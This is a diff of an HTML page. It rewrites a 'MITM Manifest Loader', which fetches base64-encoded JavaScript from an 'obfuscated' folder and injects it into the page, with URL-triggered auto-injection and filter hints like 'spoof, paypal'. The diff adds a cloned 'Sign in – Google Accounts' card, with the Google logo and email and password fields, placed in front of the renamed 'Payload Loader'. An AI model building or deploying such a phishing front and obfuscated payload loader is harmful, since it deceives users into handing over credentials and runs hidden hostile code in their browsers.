@@ -1,217 +1,140 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>MITM Manifest Loader</title>
-  <style>
-    :root { color-scheme: dark; }
-    body { background:#000; color:#0f0; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; margin:0; padding:16px; }
-    h1 { margin:0 0 12px; font-size:16px; color:#9f9; }
-    .row { display:flex; gap:12px; flex-wrap:wrap; align-items:center; }
-    .col { display:flex; flex-direction:column; gap:8px; }
-    label { font-size:12px; color:#bfb; }
-    input, button, select { background:#060; color:#dfd; border:1px solid #0a0; padding:8px; border-radius:6px; }
-    input::placeholder { color:#9c9; }
-    button { cursor:pointer; }
-    select { min-width:320px; height:280px; }
-    #log { margin-top:16px; border-top:1px solid #060; padding-top:12px; font-size:12px; line-height:1.5; }
-    .logline { margin:2px 0; white-space:pre-wrap; }
-    .ok { color:#9f9; }
-    .err { color:#f88; }
-    .muted { color:#9c9; }
-    .badge { background:#030; border:1px solid #060; padding:2px 6px; border-radius:999px; font-size:11px; margin-left:6px; }
-    footer { margin-top:10px; font-size:11px; color:#9c9; }
-  </style>
+<meta charset="UTF-8" />
+<title>Sign in – Google Accounts</title>
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<style>
+  :root{color-scheme:dark}
+  body{margin:0;font-family:Roboto,Arial,sans-serif;background:#000;color:#0f0}
+  /* ───────── Google-like sign-in card ───────── */
+  .card{max-width:380px;margin:6vh auto;padding:40px;background:#fff;color:#202124;
+        box-shadow:0 1px 6px rgba(32,33,36,.28);border-radius:8px;transition:.3s}
+  .card.hidden{opacity:0;pointer-events:none;transform:translateY(-20px)}
+  .logo{text-align:center;margin-bottom:20px}
+  .logo img{height:48px}
+  h1{font-weight:400;font-size:24px;margin:0 0 10px}
+  .sub{color:#5f6368;font-size:16px;margin:0 0 30px}
+  input{width:100%;font-size:16px;padding:14px 12px;border:1px solid #dadce0;border-radius:4px;
+        margin-bottom:24px;box-sizing:border-box}
+  .actions{display:flex;justify-content:space-between;align-items:center}
+  .actions a{color:#1a73e8;text-decoration:none;font-size:14px}
+  button.g-btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;font-size:14px;
+               font-weight:500;border-radius:4px;cursor:pointer}
+  /* ───────── Loader UI ───────── */
+  #loader{display:none;padding:24px}
+  .row{display:flex;flex-wrap:wrap;gap:12px}
+  .col{display:flex;flex-direction:column;gap:8px}
+  label{font-size:12px;color:#bfb}
+  select,input[type=text],button.l-btn{background:#060;color:#dfd;border:1px solid #0a0;
+       padding:8px;border-radius:6px}
+  select{min-width:320px;height:260px}
+  button.l-btn{cursor:pointer}
+  #log{margin-top:16px;font-size:12px;line-height:1.4;border-top:1px solid #060;padding-top:10px}
+  .logline{margin:2px 0;white-space:pre-wrap}
+  .ok{color:#9f9}.err{color:#f66}.muted{color:#9c9}
+  footer{margin-top:10px;font-size:11px;color:#9c9}
+  .badge{background:#030;border:1px solid #060;padding:2px 6px;border-radius:999px;font-size:11px;margin-left:6px}
+</style>
 </head>
 <body>
-  <h1>MITM Manifest Loader <span id="ver" class="badge"></span></h1>
 
+<!-- ───────── Google Sign-in Clone ───────── -->
+<div id="signin-card" class="card">
+  <div class="logo">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+  </div>
+  <h1>Sign in</h1>
+  <p class="sub">to continue to Loader Dashboard</p>
+  <input id="email" type="email" placeholder="Email or phone" required />
+  <input id="pass" type="password" placeholder="Enter your password" required />
+  <div class="actions">
+    <a href="#">Forgot email?</a>
+    <button id="next-btn" class="g-btn">Next</button>
+  </div>
+</div>
+
+<!-- ───────── Manifest Loader UI ───────── -->
+<div id="loader">
+  <h3 style="margin:0 0 8px;">Payload Loader <span id="ver" class="badge"></span></h3>
   <div class="row">
     <div class="col" style="min-width:340px;">
-      <label for="filter">Filter</label>
-      <input id="filter" type="text" placeholder="type to filter… (e.g. spoof, paypal, headers)" autocomplete="off" />
+      <label>Filter</label>
+      <input id="filter" type="text" placeholder="type to filter…" autocomplete="off"/>
     </div>
-
     <div class="col">
-      <label for="payloads">Payloads (multi-select)</label>
+      <label>Payloads (multi-select)</label>
       <select id="payloads" multiple></select>
     </div>
-
     <div class="col" style="min-width:220px;">
       <label>Actions</label>
       <div class="row">
-        <button id="btn-inject">Inject selected</button>
-        <button id="btn-copy">Copy inject URL</button>
-        <button id="btn-clear">Clear log</button>
+        <button id="inject"  class="l-btn">Inject</button>
+        <button id="copy"    class="l-btn">Copy URL</button>
+        <button id="clear"   class="l-btn">Clear log</button>
       </div>
       <label style="margin-top:8px;">
-        <input type="checkbox" id="opt-autoload"> Auto-inject on load (selected)
+        <input type="checkbox" id="autoload"> Auto-inject on load
       </label>
     </div>
   </div>
-
-  <div id="log" aria-live="polite"></div>
+  <div id="log"></div>
   <footer>
-    Uses <code>manifest.json</code> and loads from <code>obfuscated/*.js.b64</code>. URL auto-inject: <code>?inject=a.js,b.js</code> or <code>#inject=a.js,b.js</code>. Use <code>all</code> to inject everything.
+    Auto-inject via <code>?inject=a.js,b.js</code> or <code>#inject=all</code>
   </footer>
+</div>
 
-  <script>
-    // ---------- basics ----------
-    const $ = (id) => document.getElementById(id);
-    const logBox = $("log");
-    const log = (msg, cls="muted") => {
-      const div = document.createElement("div");
-      div.className = "logline " + cls;
-      const now = new Date().toISOString().split("T")[1].replace("Z","");
-      div.textContent = `[${now}] ${msg}`;
-      logBox.appendChild(div);
-      div.scrollIntoView({ block: "end" });
-    };
-
-    const safeJs = (s) => /^[\w.-]+\.js$/.test(s);
-    const uniq = (arr) => [...new Set(arr)];
-    const base = new URL(".", location.href);
-    const manifestURL = new URL("manifest.json", base).href;
-    const obfBase = new URL("obfuscated/", base).href;
-
-    const qs = new URLSearchParams(location.search);
-    function getAuto() {
-      let inject = qs.get("inject");
-      if (!inject && location.hash.startsWith("#inject=")) {
-        inject = decodeURIComponent(location.hash.slice(8));
-      }
-      if (!inject) return [];
-      if (inject.trim().toLowerCase() === "all") return ["__ALL__"];
-      return inject.split(",").map(s => s.trim()).filter(Boolean);
-    }
-
-    // ---------- state ----------
-    let manifest = [];        // array of ".js.b64" strings
-    let names = [];           // array of ".js" names (derived)
-    let filtered = [];        // current filtered set (".js")
-
-    // ---------- manifest load ----------
-    async function loadManifest() {
-      log(`Fetching manifest: ${manifestURL}`);
-      const res = await fetch(manifestURL, { cache: "no-cache" });
-      if (!res.ok) throw new Error(`HTTP ${res.status}`);
-      const data = await res.json();
-      if (!Array.isArray(data)) throw new Error("manifest must be a JSON array");
-      manifest = data.filter(x => typeof x === "string" && x.endsWith(".js.b64"));
-      names = manifest.map(s => s.replace(/\.js\.b64$/,".js"));
-      $("ver").textContent = `files: ${names.length}`;
-      log(`Manifest loaded. ${names.length} payload(s) available.`, "ok");
-    }
-
-    // ---------- UI binding ----------
-    function renderOptions(list) {
-      const sel = $("payloads");
-      sel.innerHTML = "";
-      list.forEach(n => {
-        const opt = document.createElement("option");
-        opt.value = n;
-        opt.textContent = n;
-        sel.appendChild(opt);
-      });
-    }
-
-    function applyFilter() {
-      const q = $("filter").value.trim().toLowerCase();
-      filtered = q ? names.filter(n => n.toLowerCase().includes(q)) : names.slice();
-      renderOptions(filtered);
-    }
-
-    $("filter").addEventListener("input", applyFilter);
-
-    $("btn-clear").addEventListener("click", () => {
-      logBox.innerHTML = "";
-      log("Log cleared.");
-    });
-
-    $("btn-copy").addEventListener("click", () => {
-      const sel = $("payloads");
-      const selected = Array.from(sel.selectedOptions).map(o => o.value);
-      const u = new URL(location.href);
-      if (selected.length) {
-        u.searchParams.set("inject", selected.join(","));
-        u.hash = "";
-      } else {
-        u.searchParams.delete("inject");
-      }
-      navigator.clipboard.writeText(u.toString()).then(
-        () => log("Inject URL copied to clipboard.", "ok"),
-        (e) => log("Copy failed: " + e.message, "err")
-      );
-    });
-
-    $("btn-inject").addEventListener("click", async () => {
-      const sel = $("payloads");
-      const selected = Array.from(sel.selectedOptions).map(o => o.value);
-      if (!selected.length) { log("No payload selected.", "err"); return; }
-      await injectMany(selected);
-    });
-
-    // ---------- injection ----------
-    async function injectOne(nameJs) {
-      if (!safeJs(nameJs)) { log(`Unsafe name skipped: ${nameJs}`, "err"); return; }
-      const url = obfBase + encodeURIComponent(nameJs) + ".b64";
-      log(`Fetching: ${url}`);
-      const res = await fetch(url, { cache: "no-cache" });
-      if (!res.ok) { log(`HTTP ${res.status} for ${nameJs}`, "err"); return; }
-      const encoded = (await res.text()).trim();
-      if (!encoded) { log(`Empty payload: ${nameJs}`, "err"); return; }
-      let decoded;
-      try { decoded = atob(encoded); } catch (e) { log(`Base64 decode failed: ${nameJs}`, "err"); return; }
-      const s = document.createElement("script");
-      s.type = "text/javascript";
-      s.textContent = decoded;
-      document.body.appendChild(s);
-      log(`Injected: ${nameJs}`, "ok");
-    }
-
-    async function injectMany(listJs) {
-      const queue = uniq(listJs);
-      log(`Injecting ${queue.length} payload(s)…`);
-      for (const n of queue) { /* sequential on purpose */
-        await injectOne(n);
-      }
-      log("Injection batch complete.", "ok");
-    }
-
-    // ---------- boot ----------
-    (async function boot() {
-      try {
-        await loadManifest();
-        applyFilter();
-
-        // Auto-select from URL
-        const auto = getAuto();
-        const sel = $("payloads");
-
-        if (auto.length) {
-          let targets;
-          if (auto.length === 1 && auto[0] === "__ALL__") {
-            targets = names.slice();
-            // select all in UI
-            [...sel.options].forEach(o => o.selected = true);
-            log("Auto mode: ALL", "ok");
-          } else {
-            targets = auto.filter(safeJs);
-            // reflect in UI
-            [...sel.options].forEach(o => { if (targets.includes(o.value)) o.selected = true; });
-            log("Auto mode: " + targets.join(", "), "ok");
-          }
-          await injectMany(targets);
-        } else if ($("opt-autoload").checked) {
-          // inject whatever is selected initially
-          const selected = Array.from(sel.selectedOptions).map(o => o.value);
-          if (selected.length) await injectMany(selected);
-        }
-      } catch (e) {
-        log("Startup failed: " + e.message, "err");
-      }
-    })();
-  </script>
+<script>
+/* ---------- helper ---------- */
+const $ = id => document.getElementById(id);
+const logBox=$("log");
+const log=(m,c="muted")=>{const d=document.createElement("div");d.className="logline "+c;
+d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;logBox.appendChild(d);d.scrollIntoView({block:"end"});}
+const safe=s=>/^[\w.-]+\.js$/.test(s);
+const uniq=a=>[...new Set(a)];
+/* ---------- manifest loader vars ---------- */
+const base=new URL(".",location.href);
+const manifestURL=new URL("manifest.json",base).href;
+const obfBase=new URL("obfuscated/",base).href;
+let names=[];let filtered=[];
+/* ---------- load manifest ---------- */
+async function loadManifest(){
+  log("Fetching manifest: "+manifestURL);
+  const r=await fetch(manifestURL,{cache:"no-cache"});if(!r.ok)throw Error(r.status);
+  const arr=await r.json();names=arr.filter(f=>f.endsWith(".js.b64")).map(f=>f.replace(/\.js\.b64$/,".js"));
+  $("ver").textContent=`files:${names.length}`; log("Manifest loaded ("+names.length+")","ok"); applyFilter();
+}
+/* ---------- UI ---------- */
+function applyFilter(){
+  const q=$("filter").value.toLowerCase();filtered=q?names.filter(n=>n.toLowerCase().includes(q)):names.slice();
+  const sel=$("payloads");sel.innerHTML="";filtered.forEach(n=>{const o=document.createElement("option");o.value=n;o.text=n;sel.appendChild(o);});}
+$("filter").oninput=applyFilter;
+$("clear").onclick=()=>{logBox.innerHTML="";log("Log cleared.");}
+$("copy").onclick=()=>{const sel=$("payloads");const s=[...sel.selectedOptions].map(o=>o.value);
+  const u=new URL(location.href);if(s.length)u.searchParams.set("inject",s.join(","));else u.searchParams.delete("inject");
+  navigator.clipboard.writeText(u.toString()).then(()=>log("URL copied","ok"),e=>log("Copy failed:"+e,"err"));}
+/* ---------- inject ---------- */
+async function injectMany(list){for(const n of uniq(list)){await injectOne(n);} log("Batch complete.","ok");}
+async function injectOne(name){if(!safe(name)){log("Unsafe:"+name,"err");return;}
+  const u=obfBase+name+".b64";log("Fetching "+u);
+  const r=await fetch(u,{cache:"no-cache"});if(!r.ok){log("HTTP "+r.status,"err");return;}
+  const txt=(await r.text()).trim();if(!txt){log("Empty payload "+name,"err");return;}
+  const js=atob(txt);const s=document.createElement("script");s.text=js;document.body.appendChild(s);log("Injected "+name,"ok");}
+$("inject").onclick=()=>{const sel=$("payloads");const s=[...sel.selectedOptions].map(o=>o.value);if(!s.length){log("No selection","err");return;}injectMany(s);}
+/* ---------- auto mode ---------- */
+function autoTargets(){const q=new URLSearchParams(location.search);let inj=q.get("inject");
+ if(!inj&&location.hash.startsWith("#inject="))inj=decodeURIComponent(location.hash.slice(8));
+ if(!inj)return []; return inj.trim().toLowerCase()==="all"?["__ALL__"]:inj.split(",").map(t=>t.trim()).filter(Boolean);}
+async function bootLoader(){
+  try{await loadManifest();const auto=autoTargets();if(auto.length){const list=auto[0]==="__ALL__"?names:uniq(auto.filter(safe));
+      [...$("payloads").options].forEach(o=>{if(list.includes(o.value))o.selected=true;});
+      log("Auto mode: "+list.join(","),"ok"); await injectMany(list);}
+  }catch(e){log("Loader error:"+e.message,"err");}}
+/* ---------- sign-in flow ---------- */
+$("next-btn").onclick=()=>{
+  $("signin-card").classList.add("hidden");
+  setTimeout(()=>{ $("signin-card").style.display="none"; $("loader").style.display="block"; bootLoader(); },300);
+};
+</script>
 </body>
 </html>
